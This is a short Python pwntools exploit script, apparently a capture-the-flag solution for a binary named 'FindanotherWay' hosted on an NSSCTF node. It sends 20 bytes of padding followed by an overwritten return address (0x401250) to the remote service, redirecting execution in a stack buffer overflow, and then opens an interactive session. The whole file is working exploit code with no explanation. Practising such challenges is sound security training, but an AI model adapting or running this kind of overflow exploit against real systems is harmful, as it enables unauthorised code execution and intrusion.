from pwn import *
p = remote("node5.anna.nssctf.cn", 23479)
elf = ELF('./FindanotherWay')
padding = 20
rt_addr = 0x401250
payload = b'A'* padding + p64(rt_addr)
p.sendline(payload)
p.interactive()